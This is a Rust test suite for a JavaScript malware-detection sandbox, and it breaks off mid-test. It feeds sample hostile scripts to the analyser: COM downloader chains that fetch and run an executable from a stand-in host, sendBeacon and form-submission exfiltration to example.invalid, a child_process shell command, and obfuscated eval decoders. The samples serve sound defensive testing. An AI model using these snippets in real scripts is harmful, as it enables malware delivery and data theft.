use js_analysis::{DynamicOptions, DynamicOutcome, RuntimePhase};

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_skips_large_payload() {
    let options = DynamicOptions { max_bytes: 8, ..DynamicOptions::default() };
    let data = b"this is too large";
    let outcome = js_analysis::run_sandbox(data, &options);
    match outcome {
        DynamicOutcome::Skipped { reason, limit, actual } => {
            assert_eq!(reason, "payload_too_large");
            assert_eq!(limit, 8);
            assert_eq!(actual, data.len());
        }
        _ => panic!("expected skip"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_classifies_oversized_token_decoder_payload() {
    let options = DynamicOptions { max_bytes: 32, ..DynamicOptions::default() };
    let payload = b"/*@cc_on*/var x='a'['split']('!');for(i=0;i<x.length;i++){ }eval(x);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Skipped { reason, limit, actual } => {
            assert_eq!(reason, "payload_too_large_token_decoder");
            assert_eq!(limit, 32);
            assert_eq!(actual, payload.len());
        }
        _ => panic!("expected skip"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_skips_obfuscated_token_decoder_payload() {
    let options = DynamicOptions::default();
    let body = "A!".repeat(24_500);
    let payload = format!(
        "var U='';var V=\"{}\"[\"s\"+\"plit\"]('!');/*@cc_on\nfor(i=0;i<V.length;i++){{U+=V[i];}}\n@*/eval(U);",
        body
    );
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Skipped { reason, .. } => {
            assert_eq!(reason, "complex_token_decoder_payload");
        }
        _ => panic!("expected skip"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_exec_records_calls() {
    let options = DynamicOptions::default();
    let outcome = js_analysis::run_sandbox(b"app.alert('hi')", &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "alert"));
            assert!(signals.call_count >= 1);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_emits_delta_summary_for_dynamic_code() {
    let options = DynamicOptions::default();
    let payload = br#"eval("var stageTwo = 7; app.alert('stage2');");"#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let delta = signals.delta_summary.expect("delta summary");
            assert!(
                delta.phase == "open"
                    || delta.phase == "idle"
                    || delta.phase == "click"
                    || delta.phase == "form"
            );
            assert!(delta.generated_snippets >= 1);
            assert!(delta.trigger_calls.iter().any(|call| call == "eval"));
            assert!(delta.added_identifier_count >= 1);
            assert!(
                delta.new_identifiers.iter().any(|value| value == "stageTwo")
                    || delta.new_calls.iter().any(|value| value == "alert")
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_dormant_large_payloads() {
    let options = DynamicOptions::default();
    let payload = "/* large inert */".repeat(2_000);
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "dormant_or_gated_execution"),
                "expected dormant-or-gated pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_dormant_marker_rich_mid_sized_payloads() {
    let options = DynamicOptions::default();
    let mut payload = "/*@cc_on*/".to_string();
    payload.push_str(&"A".repeat(9_000));
    payload.push_str("/* marker */eval('x');'abc'.split('').reverse().join('');");
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "dormant_or_gated_execution"),
                "expected dormant-or-gated pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_telemetry_budget_saturation() {
    let options = DynamicOptions::default();
    let payload = "for (var i = 0; i < 5000; i++) { app.alert('x'); }";
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "telemetry_budget_saturation"),
                "expected telemetry saturation pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_indirect_dynamic_eval_dispatch() {
    let options = DynamicOptions::default();
    let payload = br#"
        var root = Function('return this')();
        root['ev' + 'al'](\"app.alert('indirect')\");
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "indirect_dynamic_eval_dispatch"),
                "expected indirect dynamic eval dispatch pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_multi_pass_decode_pipeline() {
    let options = DynamicOptions::default();
    let payload = br#"
        var a = unescape('%61%6c%65%72%74%28%31%29');
        var b = unescape('%27%78%27');
        var c = String.fromCharCode(97,108,101,114,116,40,39,120,39,41);
        eval(a);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "multi_pass_decode_pipeline"),
                "expected multi-pass decode pipeline pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_timing_probe_evasion() {
    let options = DynamicOptions::default();
    let payload = br#"
        setTimeout(function(){}, 1);
        setInterval(function(){}, 2);
        WScript.Quit(1);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "timing_probe_evasion"),
                "expected timing probe evasion pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_capability_matrix_fingerprinting() {
    let options = DynamicOptions::default();
    let payload = br#"
        Object.keys(this);
        app.alert('x');
        navigator.sendBeacon('https://example.invalid/beacon');
        WScript.CreateObject('Scripting.FileSystemObject');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "capability_matrix_fingerprinting"),
                "expected capability matrix fingerprinting pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_covert_beacon_exfil() {
    let options = DynamicOptions::default();
    let payload = br#"
        var data = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        navigator.sendBeacon('https://ab12cd34ef56gh78ij90.example.invalid/track?d=' + data + data);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "covert_beacon_exfil"),
                "expected covert beacon exfil pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_prototype_chain_execution_hijack() {
    let options = DynamicOptions::default();
    let payload = br#"
        eval("Object.prototype._x='1';var o={};o.__proto__._y=2;");
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "prototype_chain_execution_hijack"),
                "expected prototype chain execution hijack pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wasm_loader_staging() {
    let options = DynamicOptions::default();
    let payload = br#"
        WebAssembly.Module('00');
        WebAssembly.instantiate('00');
        eval('1');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wasm_loader_staging"),
                "expected wasm loader staging pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_runtime_dependency_loader_abuse() {
    let options = DynamicOptions::default();
    let payload = br#"
        var cp = require('child_process');
        cp.exec('cmd.exe /c whoami');
        var fs = require('fs');
        fs.writeFileSync('tmp.txt', 'x');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "runtime_dependency_loader_abuse"),
                "expected runtime dependency loader abuse pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_credential_harvest_form_emulation() {
    let options = DynamicOptions::default();
    let payload = br#"
        addField('email');
        getField('email');
        submitForm('https://example.invalid/collect');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "credential_harvest_form_emulation"),
                "expected credential harvest form emulation pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_does_not_flag_wasm_loader_staging_for_benign_wasm_absence() {
    let options = DynamicOptions::default();
    let payload = b"var x = 1 + 2; app.alert(x);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                !signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wasm_loader_staging"),
                "unexpected wasm loader staging pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_does_not_flag_runtime_dependency_loader_abuse_for_single_safe_require() {
    let options = DynamicOptions::default();
    let payload = b"var path = require('path'); path.join('a','b');";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                !signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "runtime_dependency_loader_abuse"),
                "unexpected runtime dependency loader abuse pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_does_not_flag_credential_harvest_for_field_reads_without_submission() {
    let options = DynamicOptions::default();
    let payload = b"addField('note'); getField('note');";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                !signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "credential_harvest_form_emulation"),
                "unexpected credential harvest pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_calibrates_downloader_chain_confidence_by_completeness() {
    let options = DynamicOptions::default();
    let full_chain = br#"
        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.invalid/payload.exe', false);
        xhr.send();
        var stream = new ActiveXObject('ADODB.Stream');
        stream.Open();
        stream.Write('MZ');
        stream.SaveToFile('C:\\Temp\\payload.exe', 2);
        var shell = new ActiveXObject('WScript.Shell');
        shell.Run('C:\\Temp\\payload.exe', 0, false);
    "#;
    let partial_chain = br#"
        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.invalid/payload.exe', false);
        xhr.send();
    "#;
    let full = js_analysis::run_sandbox(full_chain, &options);
    let partial = js_analysis::run_sandbox(partial_chain, &options);
    match (full, partial) {
        (DynamicOutcome::Executed(full_signals), DynamicOutcome::Executed(partial_signals)) => {
            let full_conf = full_signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "com_downloader_execution_chain")
                .map(|pattern| pattern.confidence)
                .expect("full chain confidence");
            let partial_conf = partial_signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "com_downloader_network_chain")
                .map(|pattern| pattern.confidence)
                .expect("partial chain confidence");
            assert!(full_conf > partial_conf, "full={} partial={}", full_conf, partial_conf);
        }
        _ => panic!("expected executed outcomes"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_execution_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.invalid/payload.exe', false);
        xhr.send();
        var stream = new ActiveXObject('ADODB.Stream');
        stream.Open();
        stream.Write('MZ');
        stream.SaveToFile('C:\\Temp\\payload.exe', 2);
        stream.Close();
        var shell = new ActiveXObject('WScript.Shell');
        shell.Run('C:\\Temp\\payload.exe', 0, false);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_execution_chain"),
                "expected COM downloader execution pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_staging_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.invalid/stage.bin', false);
        xhr.send();
        xhr.setRequestHeader('User-Agent', 'Mozilla/5.0');
        var stream = new ActiveXObject('ADODB.Stream');
        stream.Open();
        var shell = new ActiveXObject('WScript.Shell');
        shell.ExpandEnvironmentStrings('%TEMP%');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_staging_chain"),
                "expected COM downloader staging pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_network_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.invalid/dropper', false);
        xhr.send();
        var folder = WScript.CreateObject('Scripting.FileSystemObject');
        folder.CreateFolder('C:\\Temp\\cache');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_network_chain"),
                "expected COM downloader network pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_environment_gating() {
    let options = DynamicOptions::default();
    let payload = br#"
        var shell = WScript.CreateObject('WScript.Shell');
        shell.Environment('PROCESS').Item('COMPUTERNAME');
        shell.ExpandEnvironmentStrings('%TEMP%');
        WScript.Sleep(50);
        WScript.Quit(0);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wsh_environment_gating"),
                "expected WSH environment gating pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_direct_execution_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.invalid/dropper.exe', false);
        xhr.send();
        var shell = new ActiveXObject('WScript.Shell');
        shell.ExpandEnvironmentStrings('%TEMP%');
        shell.Run('http://example.invalid/dropper.exe', 0, false);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_direct_execution_chain"),
                "expected COM downloader direct-execution pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_com_object_probe() {
    let options = DynamicOptions::default();
    let payload = br#"
        var obj = WScript.CreateObject('Scripting.FileSystemObject');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wsh_com_object_probe"),
                "expected WSH COM probe pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_dormant_marked_small_payload() {
    let options = DynamicOptions::default();
    let payload = format!(
        "var markerA='ADODB.Stream';var markerB='ActiveXObject';var markerC='MSXML2.XMLHTTP.open';var padding='{}';",
        "X".repeat(4096)
    );
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "dormant_marked_small_payload"),
                "expected dormant marked small payload pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_file_drop_staging() {
    let options = DynamicOptions::default();
    let payload = br#"
        var stream = WScript.CreateObject('ADODB.Stream');
        stream.Open();
        stream.Write('MZ');
        stream.SaveToFile('C:\\Temp\\drop.bin', 2);
        stream.Close();
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_file_drop_staging"),
                "expected COM file-drop staging pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_timing_gate() {
    let options = DynamicOptions::default();
    let payload = b"var gate='eval(' + 'x)'; WScript.Sleep(1);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wsh_timing_gate"),
                "expected WSH timing gate pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_incomplete_network_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = WScript.CreateObject('MSXML2.XMLHTTP');
        var shell = WScript.CreateObject('WScript.Shell');
        shell.ExpandEnvironmentStrings('%TEMP%');
        WScript.Sleep(1);
        xhr.send();
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_incomplete_network_chain"),
                "expected incomplete downloader chain pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_incomplete_open_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = WScript.CreateObject('MSXML2.XMLHTTP');
        WScript.Sleep(1);
        xhr.open('GET', 'http://example.invalid/stage', false);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_incomplete_open_chain"),
                "expected incomplete-open downloader pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_direct_run_execution() {
    let options = DynamicOptions::default();
    let payload = br#"
        var shell = WScript.CreateObject('WScript.Shell');
        shell.Run('cmd.exe /c calc.exe', 0, false);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wsh_direct_run_execution"),
                "expected WSH direct-run pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_network_buffer_staging() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = WScript.CreateObject('MSXML2.XMLHTTP');
        var stream = WScript.CreateObject('ADODB.Stream');
        xhr.send();
        stream.Open();
        stream.Write('MZ');
        stream.Close();
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_network_buffer_staging"),
                "expected COM network-buffer staging pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_early_quit_gate() {
    let options = DynamicOptions::default();
    let payload = b"var marker='split(' + 'x)'; WScript.Quit(1);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wsh_early_quit_gate"),
                "expected WSH early-quit gate pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_sleep_only_execution() {
    let options = DynamicOptions::default();
    let payload = format!("var pad='{}'; WScript.Sleep(1);", "X".repeat(3000));
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wsh_sleep_only_execution"),
                "expected WSH sleep-only pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_omits_delta_summary_without_dynamic_code() {
    let options = DynamicOptions::default();
    let outcome = js_analysis::run_sandbox(b"app.alert('hello')", &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.delta_summary.is_none());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_emits_phase_scoped_telemetry() {
    let options = DynamicOptions::default();
    let payload = b"
        function onIdle() { app.alert('idle'); }
        function onClick() { app.alert('click'); }
        function onSubmit() { app.alert('form'); }
        app.alert('open');
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let phase_names =
                signals.phases.iter().map(|phase| phase.phase.as_str()).collect::<Vec<_>>();
            assert_eq!(phase_names, vec!["open", "idle", "click", "form"]);
            for phase in &signals.phases {
                assert!(phase.elapsed_ms <= options.timeout_ms);
            }
            let open =
                signals.phases.iter().find(|phase| phase.phase == "open").expect("open phase");
            let click =
                signals.phases.iter().find(|phase| phase.phase == "click").expect("click phase");
            let form =
                signals.phases.iter().find(|phase| phase.phase == "form").expect("form phase");
            assert!(open.call_count >= 1);
            assert!(click.call_count >= 1);
            assert!(form.call_count >= 1);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_respects_custom_phase_selection() {
    let mut options = DynamicOptions::default();
    options.phases = vec![RuntimePhase::Open, RuntimePhase::Idle];
    let payload = b"function onIdle(){app.alert('idle')} app.alert('open')";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let phase_names =
                signals.phases.iter().map(|phase| phase.phase.as_str()).collect::<Vec<_>>();
            assert_eq!(phase_names, vec!["open", "idle"]);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_replay_id_is_stable_for_same_input() {
    let options = DynamicOptions::default();
    let payload = b"app.alert('stable');";
    let first = js_analysis::run_sandbox(payload, &options);
    let second = js_analysis::run_sandbox(payload, &options);
    match (first, second) {
        (DynamicOutcome::Executed(a), DynamicOutcome::Executed(b)) => {
            assert_eq!(a.replay_id, b.replay_id);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_tracks_truncation_invariants() {
    let options = DynamicOptions::default();
    let mut payload = String::from("for (var i = 0; i < 2600; i++) {");
    payload.push_str("app.alert(i);");
    payload.push_str("fetch('https://example.test/' + i);");
    payload.push_str("}");
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.truncation.calls_dropped > 0);
            assert!(signals.truncation.call_args_dropped > 0);
            assert!(signals.truncation.urls_dropped > 0);
            assert!(signals.truncation.domains_dropped > 0);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_short_circuits_repetitive_probe_loops() {
    let options = DynamicOptions::default();
    let payload = b"
        var f = new ActiveXObject('Scripting.FileSystemObject');
        var i = 0;
        while (!f.FolderExists('C:/temp') && i < 2000) { i++; }
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .calls
                .iter()
                .any(|call| call == "Scripting.FileSystemObject.FolderExists"));
            assert!(signals.execution_stats.probe_loop_short_circuit_hits > 0);
            assert_eq!(signals.execution_stats.adaptive_loop_profile, "host_probe");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_suppresses_runtime_limit_for_sentinel_spin_with_wsh_calls() {
    let options = DynamicOptions::default();
    let payload = b"
        var shell = WScript.CreateObject('WScript.Shell');
        var tempPath = shell.ExpandEnvironmentStrings('%TEMP%');
        var shellApp = new ActiveXObject('Shell.Application');
        shellApp.NameSpace(7);
        var tone = 1;
        while (true) {
            tone = tone + 1;
            if (tone == 300000000) {
                break;
            }
        }
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|call| call == "WScript.CreateObject"));
            assert!(signals
                .calls
                .iter()
                .any(|call| call == "WScript.Shell.ExpandEnvironmentStrings"));
            assert_eq!(signals.execution_stats.adaptive_loop_profile, "sentinel_spin");
            assert!(
                !signals
                    .errors
                    .iter()
                    .any(|error| error.to_ascii_lowercase().contains("loop iteration limit")),
                "unexpected loop limit error: {:?}",
                signals.errors
            );
            assert!(signals.execution_stats.probe_loop_short_circuit_hits > 0);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_busy_wait_increment_loop_profile() {
    let options = DynamicOptions::default();
    let payload = b"
        var spin = 0;
        while (spin < 999999) { spin++; }
        var xhr = WScript.CreateObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.test/counter', false);
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|call| call == "WScript.CreateObject"));
            assert!(signals.calls.iter().any(|call| call == "MSXML2.XMLHTTP.open"));
            assert!(
                !signals
                    .errors
                    .iter()
                    .any(|error| error.to_ascii_lowercase().contains("loop iteration limit")),
                "unexpected loop limit error: {:?}",
                signals.errors
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_deduped_lists_are_deterministically_sorted() {
    let options = DynamicOptions::default();
    let payload = b"
        app.newDoc();
        app.createDataObject({ cName: 'x' });
        app.exportAsFDF();
        app.newDoc();
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let mut sorted = signals.prop_writes.clone();
            sorted.sort();
            sorted.dedup();
            assert_eq!(signals.prop_writes, sorted);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_app_doc_annots_payload() {
    let options = DynamicOptions::default();
    let payload = b"var z; var y; z = y = app.doc; y = 0; z.syncAnnotScan(); y = z; var p = y.getAnnots({ nPage: 0 }); var s = p[0].subject; var l = s.replace(/z/g, '%'); s = unescape(l); eval(s); s = ''; z = 1;";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
